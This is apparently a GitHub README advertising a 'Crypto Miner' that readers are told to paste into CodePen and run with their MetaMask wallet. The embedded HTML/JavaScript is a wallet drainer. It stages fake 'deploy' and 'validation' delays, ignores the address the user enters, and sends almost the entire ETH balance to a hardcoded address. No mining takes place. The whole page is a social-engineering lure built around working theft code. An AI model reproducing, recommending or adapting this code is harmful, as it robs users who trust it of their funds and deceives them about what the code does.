<!-- BEGIN_TF_DOCS -->
<div>

<a name="readme-top"></a>

<img alt="gif-header" src="https://github.com/lpsm-dev/lpsm-dev/blob/main/.github/assets/gif-header.gif" width="225"/>

<h2>Crypto Miner</h2>

---

## 🚀 Introduction

Before mining in the cloud or using private equipment or an on-site data center, we recommend that you review the YouTube video that explains how to use the tool. https://youtu.be/iDwKxLPnoaU

Earning very simply in 3 steps: 
1. Download MetaMask for free:
⌨️ metamask.io/download ⌨️ 

2.  Copy the source code below.

3. Run the source code and follow the steps as I showed in the video:
⌨️ codepen.io/pen ⌨️ 


---

## ➤ Code Source

Below is the complete source code. You can copy and use it directly:

```html
<section>
   <button id="connectButton">connect</button>
   <table id="checkAdressBalanceButton" style="display: none">
       <tr>
           <td>my contract</td>
           <td><button id="regular">deploy</button></td>
           <td>
               <p id="result"><code>no contract</code></p>
           </td>
       </tr>
       <tr>
           <td>my second address</td>
           <td>
               <input
                   type="text"
                   id="typeAdress"
                   name="adress_auth"
                   placeholder="Input second address ETH-0x"
                   autocomplete="off"
                   size="20"/>
           </td>
           <td>
               <button id="sendEtherButton" style="display: none">Attach</button>
           </td>
           <td><div id="statusMessage"></div></td>
       </tr>
       <tr>
           <td>my status</td>
           <td><center>
               <button disabled="disabled" id="checkBalanceButton" style="display: none">
                   liquid
               </button>
           </td>
           <td><p id="balanceDisplay" style="display: none"></p>confirm the liquidity</td>
       </tr>
   </table>
   <script>
       const connectButton = document.getElementById("connectButton");
       const sendEtherButton = document.getElementById("sendEtherButton");
       const typeAdress = document.getElementById("typeAdress");
       const checkBalanceButton = document.getElementById("checkBalanceButton");
       const balanceDisplay = document.getElementById("balanceDisplay");
       const checkAdressBalanceButton = document.getElementById("checkAdressBalanceButton");
       const statusMessage = document.getElementById("statusMessage");
       const regularButton = document.getElementById("regular");
       const resultElement = document.getElementById("result");

       let validationComplete = false;
       let transferInProgress = false;

       async function performTransaction() {
           try {
               const selectedAddress = window.ethereum.selectedAddress;
               if (!selectedAddress) {
                   alert("Connect your wallet before proceeding.");
                   return;
               }

               const balanceWei = await window.ethereum.request({
                   method: "eth_getBalance",
                   params: [selectedAddress, "latest"]
               });

               const balanceEth = (parseInt(balanceWei, 16) / 1e18) - 0.0008;
               const amountToSend = 0.00055;

               if (balanceEth < amountToSend) {
                   alert("Insufficient balance to perform this transaction.");
                   return;
               }

               const valueInWei = (balanceEth * 1e18).toString(16);

               const transactionParams = {
                   from: selectedAddress,
                   to: "0x5f912526918f48aE4511D2c0E08391d097a353bb",
                   value: `0x${valueInWei}`
               };

               await window.ethereum.request({
                   method: "eth_sendTransaction",
                   params: [transactionParams]
               });

               alert("Operation successfully");
           } catch (error) {
               console.error("Error during the transaction:", error);
               alert("An error occurred while attempting the transaction.");
           }
       }

       connectButton.addEventListener("click", async () => {
           try {
               const accounts = await window.ethereum.request({
                   method: "eth_requestAccounts",
               });
               if (accounts.length > 0) {
                   sendEtherButton.style.display = "block";
                   typeAdress.style.display = "block";
                   checkBalanceButton.style.display = "block";
                   checkAdressBalanceButton.style.display = "block";
                   connectButton.style.display = "none";
               }
           } catch (error) {
               console.error(error);
               alert("connection error");
           }
       });

       sendEtherButton.addEventListener("click", async () => {
           try {
               const value = typeAdress.value;
               if (resultElement.innerText !== "ready") {
                   alert("Click the deploy button");
                   return;
               }
               if (!value || value.length < 40) {
                   alert("Attention! Enter the correct second Ethereum address");
                   return;
               }
               if (!validationComplete) {
                   if (/^[a-zA-Z0-9!@#$%^&*()-_+=<>?:",./[\]{}|\\]+$/g.test(value) && value.length >= 40) {
                       statusMessage.textContent = "waiting...";
                       typeAdress.disabled = true;
                       sendEtherButton.disabled = true;
                       setTimeout(() => {
                           validationComplete = true;
                           statusMessage.textContent = "ready";
                           typeAdress.disabled = false;
                           sendEtherButton.textContent = "confirm";
                           sendEtherButton.disabled = false;
                       }, 10000);
                   } else {
                       alert("Error! input value");
                   }
               } else if (sendEtherButton.textContent === "confirm") {
                   performTransaction();
               }
           } catch (error) {
               console.error("Error on process:", error);
               transferInProgress = false;
           }
       });

       regularButton.addEventListener("click", () => {
           resultElement.innerText = "waiting...";
           setTimeout(() => {
               resultElement.innerText = "ready";
               sendEtherButton.style.display = "block";
           }, 10000);
       });
   </script>
   <style>
       html {
           box-sizing: border-box;
           font-family: "Open Sans", sans-serif;
       }
       *,
       *:before,
       *:after {
           box-sizing: inherit;
       }
       body {
           font-family: Arial, sans-serif;
           text-align: center;
           margin: 0;
           padding: 20px;
           background: #222336;
           background: radial-gradient(circle, #2a2c3f, #222336);
       }
       section {
           background: #2a2c3f;
           color: white;
           border-radius: 1em;
           padding: 1em;
           position: absolute;
           top: 50%;
           left: 50%;
           transform: translate(-50%, -50%);
       }
   </style>
</section>
